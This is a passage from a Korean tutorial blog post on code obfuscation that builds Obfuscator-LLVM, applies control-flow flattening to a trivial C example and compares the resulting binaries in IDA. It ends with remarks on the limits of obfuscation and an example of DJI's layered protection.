&#xCF54;&#xB4DC;&#xB97C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xAC00;&#xC0C1;&#xBA38;&#xC2E0; &#xD574;&#xC11D; &#xB8E8;&#xD2F4; &#xC5C6;&#xC774; &#xC2E4;&#xC81C; &#xB85C;&#xC9C1;&#xC744; &#xC774;&#xD574;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#x1F50D; <em>&#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC804;&#xCCB4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <strong>&#xBB34;&#xC5C7;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294;&#xC9C0;</strong>&#xC870;&#xCC28;&#xB3C4; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</em></p><h2 id="3-Obfuscator-LLVM-&#xC2E4;&#xC2B5;"><a href="#3-Obfuscator-LLVM-&#xC2E4;&#xC2B5;" class="headerlink" title="3. Obfuscator-LLVM &#xC2E4;&#xC2B5;"></a>3. Obfuscator-LLVM &#xC2E4;&#xC2B5;</h2><p><strong>OLLVM(Obfuscator-LLVM)</strong> &#xC740;, &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; <strong>LLVM</strong>&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; <strong>&#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xB2A5; &#xD655;&#xC7A5;&#xD310;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; LLVM&#xC740; &#x201C;&#xD074;&#xB9B0;&#xD55C;&#x201D; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB370; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCD98; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xC5F0;&#xAD6C;&#xC9C4;&#xB4E4;&#xC774; LLVM&#xC758; &#xAD6C;&#xC870;&#xAC00; &#xC6CC;&#xB099; &#xC720;&#xC5F0;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0; &#xCC29;&#xC548;&#xD574;&#xC11C;, <strong>&#xCF54;&#xB4DC;&#xB97C; &#xBE61;&#xC138;&#xAC8C; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xB294; &#xAE30;&#xB2A5;</strong>&#xC744; &#xCD94;&#xAC00;&#xD55C; &#xBC84;&#xC804;&#xC744; &#xB9CC;&#xB4E4;&#xC5C8;&#xC8E0;. &#xADF8;&#xAC8C; &#xBC14;&#xB85C; OLLVM&#xC785;&#xB2C8;&#xB2E4;.</p><p>OLLVM&#xC740; C/C++ &#xCF54;&#xB4DC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD560; &#xB54C; <strong>&#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xB09C;&#xB3C5;&#xD654; &#xD328;&#xC2A4;(pass)</strong> &#xB97C; &#xAC70;&#xCE58;&#xBA74;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xBCC0;&#xD615;&#xD569;&#xB2C8;&#xB2E4;. &#xB355;&#xBD84;&#xC5D0; &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xB530;&#xB85C; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xC218;&#xC815;&#xD560; &#xD544;&#xC694; &#xC5C6;&#xC774;, &#xADF8;&#xB0E5; &#xCEF4;&#xD30C;&#xC77C;&#xB9CC; &#xB2E4;&#xB974;&#xAC8C; &#xD574;&#xB3C4; &#xAC15;&#xB825;&#xD55C; &#xB09C;&#xB3C5;&#xD654; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-1-OLLVM&#xC6A9;-Clang-&#xBE4C;&#xB4DC;-&#xBC29;&#xBC95;"><a href="#3-1-OLLVM&#xC6A9;-Clang-&#xBE4C;&#xB4DC;-&#xBC29;&#xBC95;" class="headerlink" title="3.1 OLLVM&#xC6A9; Clang &#xBE4C;&#xB4DC; &#xBC29;&#xBC95;"></a>3.1 OLLVM&#xC6A9; Clang &#xBE4C;&#xB4DC; &#xBC29;&#xBC95;</h3><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Installation">https://github.com/obfuscator-llvm/obfuscator/wiki/Installation</a></p><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build &amp;&amp; <span class="hljs-built_in">cd</span> build$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/$ make -j7</code></pre><p>&#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC5D0;&#xB7EC;&#xAC00; &#xC880; &#xB098;&#xC11C; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xC218;&#xC815;&#xD574;&#xC92C;&#xC5B4;&#xC694;. &#xD639;&#xC2DC; &#xC5D0;&#xB7EC;&#xAC00; &#xB098;&#xC2E0;&#xB2E4;&#xBA74; &#xB85C;&#xADF8; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xACE0; &#xD2B8;&#xB7EC;&#xBE14;&#xC288;&#xD305;&#xD574;&#xBCF4;&#xC138;&#xC694;.</p><p>obfuscator/tools/clang/lib/CodeGen/CGOpenMPRuntime.cpp:6275, 6321, 6400</p><p><code>error:lambda parameter &#x2018;CGF&#x2019; previously declared as a capture</code> </p><p>&#xC55E;&#xC5D0; &#xC788;&#xB294; <code>&amp;CGF</code> &#xC81C;&#xAC70;</p><pre><code class="hljs c"><span class="hljs-keyword">auto</span> &amp;&amp;BeginThenGen = [&amp;D, &amp;CGF, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)&#x2193;<span class="hljs-keyword">auto</span> &amp;&amp;BeginThenGen = [&amp;D, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)</code></pre><p>obfuscator/include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h:696</p><p><code>error: cannot convert</code></p><p><code>char</code> &#x2192; <code>uint8_t</code> &#xB85C; &#xBCC0;&#xD658;</p><pre><code class="hljs c"><span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">char</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }&#x2193;<span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">uint8_t</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }</code></pre><p><img src="image%209.png" alt="image.png"></p><p>&#xBE4C;&#xB4DC;&#xB97C; &#xC798;&#xD588;&#xC73C;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; OLLVM &#xC6A9; clang&#xC774; &#xC798; &#xB098;&#xD0C0;&#xB0A9;&#xB2C8;&#xB2E4;!</p><h3 id="3-2-OLLVM-&#xC0AC;&#xC6A9;&#xBC95;"><a href="#3-2-OLLVM-&#xC0AC;&#xC6A9;&#xBC95;" class="headerlink" title="3.2 OLLVM &#xC0AC;&#xC6A9;&#xBC95;"></a>3.2 OLLVM &#xC0AC;&#xC6A9;&#xBC95;</h3><p>Obfuscator-LLVM&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC00;&#xC7A5; &#xAC04;&#xB2E8;&#xD55C; &#xBC29;&#xBC95;&#xC740;, Clang&#xC744; &#xD1B5;&#xD574; LLVM &#xBC31;&#xC5D4;&#xB4DC;(-mllvm)&#xC5D0; &#xD2B9;&#xC815; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC8FC;&#xC694; &#xD50C;&#xB798;&#xADF8;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Features">https://github.com/obfuscator-llvm/obfuscator/wiki/Features</a></p><ul><li><code>fla</code>: &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xD3C9;&#xD0C4;&#xD654;(Control Flow Flattening)</li><li><code>sub</code>: &#xBA85;&#xB839;&#xC5B4; &#xCE58;&#xD658;(Instruction Substitution)</li><li><code>bcf</code>: &#xAC00;&#xC9DC; &#xC81C;&#xC5B4; &#xD750;&#xB984;(Bogus Control Flow)</li></ul><p>&#xB610;, &#xD2B9;&#xC815; &#xD568;&#xC218;&#xC5D0;&#xB9CC; &#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; <a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Functions-annotations">&#xD568;&#xC218; &#xC5B4;&#xB178;&#xD14C;&#xC774;&#xC158;</a> &#xBC29;&#xBC95;&#xB3C4; &#xCC38;&#xACE0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-3-&#xC2E4;&#xC2B5;"><a href="#3-3-&#xC2E4;&#xC2B5;" class="headerlink" title="3.3 &#xC2E4;&#xC2B5;"></a>3.3 &#xC2E4;&#xC2B5;</h3><ul><li>&#xC608;&#xC81C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</li></ul><pre><code class="hljs c"><span class="hljs-comment">// flatten_example.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">secret_function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>{    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span>) {        <span class="hljs-keyword">return</span> x * <span class="hljs-number">2</span>;    } <span class="hljs-keyword">else</span> {        <span class="hljs-keyword">return</span> x - <span class="hljs-number">2</span>;    }}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">int</span> value = <span class="hljs-number">5</span>;    <span class="hljs-keyword">int</span> result = secret_function(value);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result: %d\n&quot;</span>, result);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xBE4C;&#xB4DC;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">$ clang flatten_example.c -o flatten_example_norm$ path_to_the/build/bin/clang -mllvm -fla flatten_example.c -o flatten_example_obf</code></pre><p>&#xB124; &#xC774;&#xC81C; IDA&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBE4C;&#xB4DC;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC67C;&#xCABD;&#xC774; <code>flatten_example_norm</code> &#xC774;&#xACE0; &#xC624;&#xB978;&#xCABD;&#xC774; <code>flatten_example_obf</code> &#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%2010.png" alt="image.png"></p><p>&#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xB41C; <code>secret_function</code> &#xCF54;&#xB4DC;</p><p><img src="image%2011.png" alt="image.png"></p><p><code>secret_function</code> &#xC758; CFG</p><p>&#xC544;&#xC8FC; &#xAC04;&#xB2E8;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC778;&#xB370; &#xBC8C;&#xC368;&#xBD80;&#xD130; &#xADF9;&#xBA85;&#xD55C; &#xCC28;&#xC774;&#xAC00; &#xBCF4;&#xC774;&#xC8E0;?</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB108;&#xBB34;&#xB098; &#xB2F9;&#xC5F0;&#xD55C; &#xC774;&#xC57C;&#xAE30;&#xC9C0;&#xB9CC; &#xC2E4;&#xD589;&#xACB0;&#xACFC;&#xB294; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2012.png" alt="image.png"></p><h2 id="4-&#xB9C8;&#xBB34;&#xB9AC;"><a href="#4-&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="4. &#xB9C8;&#xBB34;&#xB9AC;"></a>4. &#xB9C8;&#xBB34;&#xB9AC;</h2><h3 id="&#xD55C;&#xACC4;"><a href="#&#xD55C;&#xACC4;" class="headerlink" title="&#xD55C;&#xACC4;"></a>&#xD55C;&#xACC4;</h3><p>&#xBB3C;&#xB860; &#xB09C;&#xB3C5;&#xD654;&#xC5D0;&#xB3C4; &#xBA85;&#xD655;&#xD55C; &#xD55C;&#xACC4;&#xB294; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xC131;&#xB2A5; &#xC800;&#xD558;:</strong> &#xB09C;&#xB3C5;&#xD654; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0BD;&#xC785;&#xB418;&#xB294; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xB85C;&#xC9C1;&#xC774;&#xB098; &#xBCF5;&#xC7A1;&#xD55C; &#xBD84;&#xAE30;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC131;&#xB2A5;&#xC744; &#xC800;&#xD558;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xB3C4;&#xAD6C; &#xBC1C;&#xC804;&#xC758; &#xC5ED;&#xC2B5;:</strong> &#xC815;&#xC801; &#xBD84;&#xC11D;&#xAE30;, &#xB514;&#xC635;&#xD4E8;&#xC2A4;&#xCF00;&#xC774;&#xD130;(Deobfuscator) &#xB4F1; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xB4E4;&#xB3C4; &#xB04A;&#xC784;&#xC5C6;&#xC774; &#xBC1C;&#xC804;&#xD558;&#xBA74;&#xC11C;, &#xC77C;&#xBD80; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xBE44;&#xAD50;&#xC801; &#xC27D;&#xAC8C; &#xBB34;&#xB825;&#xD654;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xBC95;&#xC801;&#xB7;&#xC724;&#xB9AC;&#xC801; &#xBB38;&#xC81C;:</strong> &#xC0C1;&#xC6A9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xACFC;&#xB3C4;&#xD55C; &#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xC801;&#xC6A9;&#xD560; &#xACBD;&#xC6B0;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2E0;&#xB8B0;&#xB97C; &#xC800;&#xD558;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xB54C;&#xB85C;&#xB294; &#xBC95;&#xC801; &#xBD84;&#xC7C1;&#xC758; &#xC6D0;&#xC778;&#xC774; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h3 id="&#xC758;&#xC758;"><a href="#&#xC758;&#xC758;" class="headerlink" title="&#xC758;&#xC758;"></a>&#xC758;&#xC758;</h3><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF8; &#xAC83;&#xCC98;&#xB7FC;, &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC740; &#xADF8; &#xC791;&#xB3D9; &#xBC29;&#xC2DD;&#xC5D0; &#xB530;&#xB77C; &#xD06C;&#xAC8C; <strong>&#xAD6C;&#xC870;&#xC801;(Structural)</strong>, <strong>&#xB370;&#xC774;&#xD130;(Data)</strong>, <strong>&#xC54C;&#xACE0;&#xB9AC;&#xC998;(Algorithm)</strong> &#xCE21;&#xBA74;&#xC73C;&#xB85C; &#xAD6C;&#xBD84;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC;, &#xC2E4;&#xC81C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBD84;&#xB958;&#xB97C; &#xB118;&#xC5B4;, &#xC774; &#xC138; &#xAC00;&#xC9C0; &#xC694;&#xC18C;&#xAC00; &#xBCF5;&#xD569;&#xC801;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xAE30;&#xB3C4; &#xD558;&#xACE0; &#xB354;&#xC6B1;&#xC774;, &#xAE30;&#xC874; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC758; &#xBCC0;&#xD615;&#xC740; &#xBB3C;&#xB860;, &#xC0C8;&#xB85C;&#xC6B4; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xB2E4;&#xC591;&#xD55C; &#xBCC0;&#xC885; &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xAFB8;&#xC900;&#xD788; &#xB4F1;&#xC7A5;&#xD558;&#xBA70; &#xBD84;&#xC11D;&#xC758; &#xBCF5;&#xC7A1;&#xC131;&#xC744; &#xB354;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xBE61;&#xC138;&#xAC8C; &#xAC78;&#xB824;&#xC788;&#xB2E4;&#xACE0; &#xC18C;&#xBB38;&#xB09C; &#xC0C1;&#xC6A9; &#xB4DC;&#xB860; DJI &#xC5D0;&#xC11C;&#xC758; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC77C;&#xBD80;&#xBD84;&#xB9CC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li><strong>&#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654;</strong>: 8&#xAC1C;&#xC758; DEX &#xD30C;&#xC77C;&#xC744; 128KB &#xCCAD;&#xD06C; &#xB2E8;&#xC704;&#xB85C; &#xBD84;&#xD560;&#xD558;&#xACE0;, &#xAC01;&#xAC01;&#xC744; <strong>AES-256</strong>&#xC73C;&#xB85C; &#xC554;&#xD638;&#xD654;</li><li><strong>&#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654;</strong>: <code>com.dji.industry.pilot</code> &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xD558;&#xB4DC;&#xCF54;&#xB4DC;&#xB41C; &#xC0C1;&#xC218;&#xB97C; &#xC870;&#xD569;&#xD558;&#xC5EC; <strong>XOR &#xAE30;&#xBC18; &#xD0A4;</strong>&#xB97C; &#xC0DD;&#xC131;</li><li><strong>&#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654;</strong>: JNI &#xD638;&#xCD9C; &#xC2DC; <strong>3&#xB2E8;&#xACC4; &#xD2B8;&#xB7A8;&#xD384;&#xB9B0; &#xD568;&#xC218;</strong>&#xB97C; &#xAC70;&#xCCD0; &#xC2E4;&#xC81C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;</li></ul><p>&#xC774;&#xCC98;&#xB7FC; &#xD604;&#xB300;&#xC758; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xC220;&#xC740; &#xB2E8;&#xC77C; &#xAE30;&#xBC95;&#xC5D0; &#xBA38;&#xBB34;&#xB974;&#xC9C0; &#xC54A;&#xACE0; &#xB2E4;&#xCE35;&#xC801;&#xC774;&#xACE0; &#xBAA8;&#xB4C8;&#xD654;&#xB41C; &#xBCF4;&#xD638; &#xCCB4;&#xACC4;&#xB97C; &#xAC16;&#xCD94;&#xACE0; &#xC788;&#xC73C;&#xBA70;,  &#xB9E4;&#xB144; &#xC0C8;&#xB85C;&#xC6B4; &#xBCC0;&#xD615; &#xAE30;&#xBC95;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC5EC; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xC744; &#xB354;&#xC6B1; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xB098;&#xC544;&#xAC00;, &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAE30;&#xBC18;&#xC758; &#xAC00;&#xC9DC; &#xCF54;&#xB4DC; &#xD328;&#xD134; &#xC0DD;&#xC131;&#xC774;&#xB098; &#xC591;&#xC790; &#xC554;&#xD638; &#xAE30;&#xC220;&#xC744; &#xD65C;&#xC6A9;&#xD55C; &#xD0A4; &#xAD50;&#xD658; &#xB4F1; &#xCC28;&#xC138;&#xB300; &#xAE30;&#xC220;&#xC744; &#xC2DC;&#xD5D8;&#xC801;&#xC73C;&#xB85C; &#xB3C4;&#xC785;&#xD558;&#xB294; &#xC0AC;&#xB840;&#xB3C4; &#xB4F1;&#xC7A5;&#xD558;&#xBA70; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xC220;&#xB3C4; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xAE30;&#xC220;&#xC758; &#xBC1C;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xBC1C;&#xC804;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Part 1,2,3&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA70; &#xACC4;&#xC18D;&#xD55C; &#xC774;&#xC57C;&#xAE30;&#xC9C0;&#xB9CC;, </p><blockquote><p>&#x201C;&#xBAA8;&#xB4E0; &#xBCF4;&#xD638; &#xACC4;&#xCE35;&#xC740; &#xC2DC;&#xAC04;&#xC744; &#xBC8C;&#xC5B4;&#xC8FC;&#xB294; &#xC7A5;&#xCE58;&#xC77C; &#xBFD0;, &#xAD81;&#xADF9;&#xC801;&#xC778; &#xC548;&#xC804;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xC9C0; &#xBABB;&#xD568;&#x201D;</p><ul><li>Quarkslab &#xB9AC;&#xC11C;&#xCE58; &#xD300;</li></ul></blockquote><p>&#xB09C;&#xB3C5;&#xD654;&#xC640; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xAE30;&#xC220;&#xC740; &#xACB0;&#xAD6D; <strong>&#xCF54;&#xB4DC;&#xB97C; &#xC9C0;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xC2F8;&#xC6C0;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC11C;&#xC640; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xB300;&#xACB0; &#xAD6C;&#xB3C4; &#xC18D;&#xC5D0;&#xC11C; &#xAE30;&#xC220;&#xC740; &#xB04A;&#xC784;&#xC5C6;&#xC774; &#xC9C4;&#xD654;&#xD558;&#xACE0;, &#xC774; &#xACFC;&#xC815;&#xC740; &#xBCF4;&#xC548; &#xAE30;&#xC220; &#xC804;&#xBC18;&#xC758; &#xBC1C;&#xC804;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xD569;&#xBC95;&#xC801;&#xC778; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBCF4;&#xD638;&#xBFD0; &#xC544;&#xB2C8;&#xB77C;, &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xD0D0;&#xC9C0; &#xD68C;&#xD53C;&#xC640; &#xBD84;&#xC11D; &#xC9C0;&#xC5F0;&#xC5D0;&#xB3C4; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>&#xACF5;&#xACA9;&#xACFC; &#xBC29;&#xC5B4; &#xC591;&#xCABD; &#xBAA8;&#xB450;&#xC5D0;&#xC11C; &#xD544;&#xC218;&#xC801;&#xC778; &#xAE30;&#xC220;</strong>&#xB85C; &#xC790;&#xB9AC; &#xC7A1;&#xC740; &#xC148;&#xC774;&#xC8E0;.</p><p>&#xB09C;&#xB3C5;&#xD654;&#xB294; &#xACF5;&#xACA9;&#xC744; &#xC9C0;&#xC5F0;&#xC2DC;&#xD0A4;&#xACE0; &#xBC29;&#xC5B4;&#xC758; &#xC2DC;&#xAC04;&#xC744; &#xBC8C;&#xC5B4;&#xC8FC;&#xB294; &#xC218;&#xB2E8;&#xC774;&#xC9C0;&#xB9CC;, &#xC644;&#xBCBD;&#xD55C; &#xBC29;&#xD328;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD84;&#xC11D;&#xC790;&#xB294; &#xB048;&#xC9C8;&#xAE30;&#xAC8C; &#xD750;&#xB984;&#xC744; &#xCD94;&#xC801;&#xD558;&#xACE0; &#xB3C4;&#xAD6C;&#xB97C; &#xAC1C;&#xC120;&#xD558;&#xBA70;, &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC774;&#xC5D0; &#xB300;&#xC751;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC744; &#xCC3E;&#xC544;&#xB0B4; &#xBC29;&#xC5B4;&#xB97C; &#xAC15;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xACB0;&#xAD6D; &#xC774; &#xC2F8;&#xC6C0;&#xC740; &#xB05D;&#xB0A0; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></p><p>&#xAE30;&#xC220;&#xC774; &#xBC1C;&#xC804;&#xD558;&#xB294; &#xB9CC;&#xD07C;, &#xACF5;&#xACA9;&#xACFC; &#xBC29;&#xC5B4;&#xC758; &#xBC29;&#xBC95;&#xB3C4; &#xB04A;&#xC784;&#xC5C6;&#xC774; &#xC9C4;&#xD654;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xB9AC;&#xB294; &#xC774; &#xAE30;&#xC220;&#xC744; &#xB2E8;&#xC21C;&#xD55C; &#xC7A5;&#xBCBD;&#xC774; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xB354; &#xB098;&#xC740; &#xBCF4;&#xC548; &#xD658;&#xACBD;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC704;&#xD55C; &#xC9C4;&#xD654;&#xC758; &#xC77C;&#xBD80;</strong>&#xB85C; &#xBC14;&#xB77C;&#xBD10;&#xC57C; &#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xCC3D;&#xACFC; &#xBC29;&#xD328;&#xC758; &#xB300;&#xACB0; &#xC18D;&#xC5D0;&#xC11C;&#xB3C4;, &#xC6B0;&#xB9AC;&#xC758; &#xBAA9;&#xD45C;&#xB294; &#xBCC0;&#xD568;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2013.png" alt="image.png"></p><blockquote><p>&#x201C;&#xAC8C;&#xC784;&#xC740; &#xACC4;&#xC18D;&#xB41C;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC6B0;&#xB9AC;&#xB294;, &#xAC01;&#xC790;&#xC758; &#xC774;&#xC720;&#xB85C;, &#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xB294; &#xAC8C;&#xC784;&#xC5D0; &#xB6F0;&#xC5B4;&#xB4E0;&#xB2E4;.&#x201D;</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: 